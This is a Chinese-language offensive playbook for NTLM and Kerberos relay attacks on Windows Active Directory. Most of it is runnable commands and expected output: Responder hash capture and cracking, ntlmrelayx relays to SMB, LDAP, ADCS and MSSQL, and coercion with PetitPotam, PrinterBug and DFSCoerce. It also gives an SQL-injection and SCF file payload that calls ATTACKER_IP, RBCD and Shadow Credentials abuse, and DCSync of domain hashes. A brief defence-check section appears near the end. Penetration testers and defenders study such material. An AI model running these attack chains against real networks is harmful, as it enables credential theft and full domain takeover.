# NTLM 中继攻击技术详解

## 1. Responder 完整配置

### 1.1 仅抓 Hash（被动模式）
```bash
# 默认模式：抓取所有 NetNTLM Hash
responder -I eth0 -dwPv

# 日志位置
ls /usr/share/responder/logs/
# 格式: SMB-NTLMv2-SSP-IP.txt

# 破解 NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# 或 john
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 1.2 配合 ntlmrelayx（中继模式）
```bash
# 1. 修改 Responder 配置，关闭 SMB 和 HTTP（让 ntlmrelayx 接管这些端口）
vi /usr/share/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. 启动 Responder
responder -I eth0 -dwPv

# 3. 另一个终端启动 ntlmrelayx
ntlmrelayx.py -tf relay_targets.txt -smb2support

# 当有认证请求到达时，ntlmrelayx 自动中继
```

## 2. ntlmrelayx 各种中继目标

### 2.1 中继到 SMB（命令执行）
```bash
# 执行命令
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\\Windows\\Temp\\out.txt"

# 执行 payload
ntlmrelayx.py -tf targets.txt -smb2support -e /path/to/payload.exe

# dump SAM（获取本地哈希）
ntlmrelayx.py -tf targets.txt -smb2support

# 交互式 shell
ntlmrelayx.py -tf targets.txt -smb2support -i
# 然后 nc 127.0.0.1 11000
```

### 2.2 中继到 LDAP/LDAPS

```bash
# Shadow Credentials（最推荐，无需额外条件）
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target TARGET$

# 中继成功后得到证书和密钥
# 使用证书获取 TGT
python3 gettgtpkinit.py -cert-pfx TARGET.pfx -pfx-pass PASSWORD DOMAIN/TARGET$ TARGET.ccache
export KRB5CCNAME=TARGET.ccache

# RBCD（基于资源的约束委派）
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user YOURCOMPUTER$

# 中继成功后，YOURCOMPUTER$ 可以模拟任意用户访问 TARGET
# 获取服务票据
impacket-getST -spn cifs/TARGET -impersonate administrator DOMAIN/YOURCOMPUTER$:PASSWORD
export KRB5CCNAME=administrator.ccache
impacket-smbexec -k -no-pass TARGET
```

### 2.3 中继到 ADCS（获取证书）

这是最强大的中继路径——可以直接拿下域控。

```bash
# 中继到 ADCS Web Enrollment
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 或指定模板
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template Machine

# 触发域控认证
python3 PetitPotam.py ATTACKER_IP DC_IP

# ntlmrelayx 输出 Base64 证书
# 保存为 .pfx 文件
echo "BASE64_CERT" | base64 -d > dc.pfx

# 用证书认证获取 TGT
certipy auth -pfx dc.pfx -dc-ip DC_IP
# 输出: DC_HOSTNAME$  NTLM Hash: aad3b435...

# 用域控机器账户 Hash 做 DCSync
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/DC_HOSTNAME$@DC_IP
```

### 2.4 中继到 MSSQL
```bash
ntlmrelayx.py -t mssql://SQL_SERVER -smb2support -q "EXEC xp_cmdshell 'whoami'"
```

### 2.5 中继到 IMAP/SMTP（Exchange）
```bash
ntlmrelayx.py -t https://EXCHANGE/EWS/Exchange.asmx -smb2support
```

## 3. 强制认证技术

### 3.1 PetitPotam（MS-EFSR）
```bash
# 无需凭据版本（未修补时）
python3 PetitPotam.py ATTACKER_IP TARGET_IP

# 需要凭据版本（修补后仍可用）
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP

# 检查是否可利用
netexec smb TARGET_IP -u USER -p PASS -M petitpotam
```

### 3.2 PrinterBug（MS-RPRN）
```bash
# 需要域凭据
# 检查 Spooler 服务
rpcdump.py DOMAIN/USER:PASS@TARGET_IP | grep MS-RPRN

# 触发
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP
# 或
python3 printerbug.py DOMAIN/USER:PASS@TARGET_IP ATTACKER_IP
```

### 3.3 DFSCoerce（MS-DFSNM）
```bash
python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP
```

### 3.4 ShadowCoerce（MS-FSRVP）
```bash
python3 shadowcoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP
```

### 3.5 其他触发方式
```sql
-- MSSQL 触发
EXEC xp_dirtree '\\ATTACKER_IP\share';

-- 通过 SQL 注入触发
'; EXEC xp_dirtree '\\ATTACKER_IP\share'; --

-- 通过文件包含 (SCF/URL/LNK)
-- 创建 .scf 文件放到共享目录
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
```

## 4. Relay to LDAP 深入：RBCD 与 Shadow Credentials

### 4.1 RBCD（基于资源的约束委派）通过中继配置

RBCD 攻击通过修改目标机器的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，授权攻击者控制的机器账户模拟任意用户。

```bash
# 中继到 LDAP 自动配置 RBCD
ntlmrelayx.py -t ldap://DC_IP --delegate-access

# 中继到 LDAPS（LDAP 签名启用但通道绑定未启用时）
ntlmrelayx.py -t ldaps://DC_IP --delegate-access

# 指定已有的机器账户
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user YOURCOMPUTER$
```

中继成功后的输出：

```
[*] Attempting to create computer in: CN=Computers,DC=domain,DC=local
[*] Adding new computer with username: YOURCOMPUTER$ and password: RANDOM_PASS
[*] Delegation rights modified successfully!
[*] YOURCOMPUTER$ can now impersonate users on TARGET$
```

**后续利用（S4U 攻击）**：

```bash
# 获取模拟 Administrator 的服务票据
impacket-getST -spn cifs/TARGET.domain.local \
  -impersonate Administrator DOMAIN/'YOURCOMPUTER$':'RANDOM_PASS'

# 使用票据
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass TARGET.domain.local
impacket-smbexec -k -no-pass TARGET.domain.local
```

### 4.2 Shadow Credentials 通过中继配置

Shadow Credentials 通过向目标的 `msDS-KeyCredentialLink` 属性写入攻击者生成的密钥对，实现无密码认证。不需要创建额外机器账户。

```bash
# 通过 ntlmrelayx 自动添加 Shadow Credential
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target TARGET$
```

中继成功后的输出：

```
[*] Shadow Credentials attack successful
[*] Certificate: TARGET.pfx (password: RANDOM_PASS)
```

**后续利用（PKINIT 认证）**：

```bash
# 使用 pywhisker 生成的证书获取 TGT
python3 gettgtpkinit.py -cert-pfx TARGET.pfx -pfx-pass RANDOM_PASS \
  DOMAIN/TARGET$ TARGET.ccache
export KRB5CCNAME=TARGET.ccache

# 获取 NT Hash（用于 Pass-the-Hash）
python3 getnthash.py -key AS_REP_KEY DOMAIN/TARGET$

# 或直接使用 certipy
certipy auth -pfx TARGET.pfx -dc-ip DC_IP
```

### 4.3 RBCD vs Shadow Credentials 对比

| 特性 | RBCD | Shadow Credentials |
|------|------|--------------------|
| 需要创建机器账户 | 是（默认）/ 可用已有 | 否 |
| 目标属性 | msDS-AllowedToActOnBehalfOfOtherIdentity | msDS-KeyCredentialLink |
| AD 功能级别要求 | 2012+ | 2016+（需 ADCS 或 Windows Hello） |
| 检测难度 | 中 | 高 |
| 清理难度 | 需删除委派配置 | 需删除 KeyCredential |

---

## 5. Relay to ADCS 深入：ESC8 证书请求

### 5.1 攻击原理

ADCS Web Enrollment (certsrv) 默认通过 HTTP 提供，不启用 EPA（Extended Protection for Authentication），可直接中继 NTLM 认证来申请证书。

### 5.2 中继到 ADCS 获取域控证书

```bash
# 使用 DomainController 模板（中继 DC 机器账户认证）
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 使用 Machine 模板（中继普通机器账户认证）
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template Machine

# 使用 User 模板（中继用户认证）
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template User
```

### 5.3 完整 ESC8 攻击链

```bash
# 步骤 1：启动中继
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 步骤 2：强制 DC 认证到攻击者
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# 步骤 3：ntlmrelayx 输出 Base64 编码证书
# [*] Certificate successfully obtained!
# [*] Saved certificate to DC01$.pfx

# 步骤 4：使用证书认证获取 TGT + NT Hash
certipy auth -pfx DC01$.pfx -dc-ip DC_IP
# 输出: DC01$ :: NTLM Hash: aad3b435...

# 步骤 5：使用 DC 机器账户 Hash 执行 DCSync
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/DC01$@DC_IP
```

### 5.4 注意事项

- CA 服务器和 DC 是同一台机器时，不能将 DC 认证中继回自身
- 需要确认目标模板允许 enrollment
- certipy 也可以直接检测 ESC8：`certipy find -u USER -p PASS -dc-ip DC_IP -vulnerable`

---

## 6. Relay 目标选择矩阵

### 6.1 各协议中继条件

| 中继目标 | 端口 | 需要条件 | 默认可中继 | 说明 |
|----------|------|----------|------------|------|
| SMB | 445 | SMB 签名未强制 | 成员服务器/工作站可 | DC 默认强制签名 |
| LDAP | 389 | LDAP 签名未强制 | 旧版 DC 可 | 2019+ 默认强制 |
| LDAPS | 636 | 通道绑定未启用 | 多数可 | 比 LDAP 更常可中继 |
| HTTP (ADCS) | 80/443 | 无 EPA | 默认可 | Web Enrollment 默认无保护 |
| MSSQL | 1433 | 无额外保护 | 默认可 | 可执行查询/xp_cmdshell |
| IMAP/SMTP | 993/587 | 无额外保护 | Exchange 可 | 邮件访问 |

### 6.2 签名与通道绑定检查

```bash
# SMB 签名检查
netexec smb 10.0.0.0/24 --gen-relay-list targets_nosigning.txt

# LDAP 签名 + 通道绑定检查
netexec ldap DC_IP -u USER -p PASS -M ldap-checker
# [+] LDAP Signing NOT Enforced!
# [+] Channel Binding NOT Enforced!

# ADCS Web Enrollment 检查
curl -sk https://CA_SERVER/certsrv/
# HTTP 200 = 可访问 = 可能可中继
```

### 6.3 协议间中继规则

| 源协议 | 可中继到 | 不可中继到 | 原因 |
|--------|----------|------------|------|
| SMB | SMB, LDAP, HTTP, MSSQL | LDAPS (有时) | 通道绑定可能阻止 |
| HTTP | LDAP, LDAPS, SMB, ADCS | - | HTTP 无签名，最灵活 |
| WebDAV (HTTP) | LDAP, LDAPS, ADCS | - | 绕过 SMB 签名的关键路径 |

### 6.4 决策快速参考

```
想拿域控？
├─ 有 ADCS Web Enrollment → Relay to ADCS (ESC8) → 证书 → DCSync
├─ LDAP 签名未强制 → Relay to LDAP → Shadow Credentials / RBCD
└─ 都不行 → Relay to SMB 成员服务器 → 横向收集凭据

触发源是 SMB 还是 HTTP？
├─ SMB 触发 → 可中继到 SMB/LDAP/HTTP（不能到签名强制的目标）
└─ HTTP 触发（WebDAV）→ 可中继到 LDAP/LDAPS/ADCS（绕过 SMB 签名）
```

---

## 7. 防御检查

```bash
# SMB 签名检查
netexec smb 10.0.0.0/24 --gen-relay-list targets_nosigning.txt

# LDAP 签名检查
netexec ldap DC_IP -u USER -p PASS -M ldap-checker

# EPA 检查
# ADCS Web Enrollment 默认无 EPA → 可中继
```

## 8. 常见问题排查

| 问题 | 原因 | 解决 |
|------|------|------|
| Relay 失败 "SMB Signing required" | 目标强制 SMB 签名 | 换目标/中继到 LDAP |
| Relay 到 LDAP 失败 | LDAP 签名/通道绑定 | 用 LDAPS (636) |
| PetitPotam 无响应 | 已修补 | 尝试 PrinterBug/DFSCoerce |
| ntlmrelayx "Connection refused" | 端口被占 | 关闭 Responder 的 SMB/HTTP |

## 9. Kerberos 中继 — krbrelayx

当目标强制 Kerberos 认证（SMB 签名开启、NTLM 被禁用）时，krbrelayx 可中继 Kerberos AP-REQ 请求。

### 9.1 攻击原理

krbrelayx 利用已知机器账户密钥解密收到的 Kerberos 服务票据（AP-REQ），提取其中的 PAC（特权属性证书），然后用提取的信息模拟用户访问目标服务。

### 9.2 前置条件

- 控制一个机器账户（已知 Hash 或密码）
- 能向 DNS 添加记录（指向攻击者 IP）
- 能触发目标向攻击者机器发起认证

### 9.3 完整攻击流程

```bash
# 步骤 1：添加 DNS A 记录指向攻击机
python3 dnstool.py -u DOMAIN\\USER -p PASS \
  -a add -r attacker.DOMAIN -d ATTACKER_IP DC_IP

# 步骤 2：启动 krbrelayx 监听
# 使用机器账户 Hash 解密收到的 Kerberos 票据
python3 krbrelayx.py -hashes :MACHINE_HASH \
  --krbsalt DOMAIN.LOCALmachineaccount$ -krbpass MACHINE_PASS

# 步骤 3：触发认证（使用 WebDAV 路径确保 HTTP 认证）
python3 PetitPotam.py -d DOMAIN -u USER -p PASS \
  attacker.DOMAIN@80/test DC_IP

# 步骤 4：krbrelayx 获取 ST（Service Ticket）
# 解密后可提取 NTLM Hash 或导出 ccache
```

### 9.4 适用场景

| 场景 | 说明 |
|------|------|
| NTLM 被禁用 | GPO 强制仅 Kerberos 认证 |
| SMB 签名强制 | 所有主机都启用 SMB 签名 |
| EPA 启用 | LDAP/HTTP 启用通道绑定 |
| 配合 Shadow Credentials | 获取机器账户 TGT 后的进一步利用 |

### 9.5 与 NTLM Relay 的区别

| 特性 | NTLM Relay | Kerberos Relay (krbrelayx) |
|------|------------|---------------------------|
| 需要凭据 | 不需要 | 需要机器账户密钥 |
| 签名绕过 | 不能绕过签名 | 可绕过 SMB 签名 |
| DNS 要求 | 不需要 | 需要添加 DNS 记录 |
| 复杂度 | 低 | 高 |
| 适用范围 | 多数场景 | NTLM 被禁用时的替代方案 |
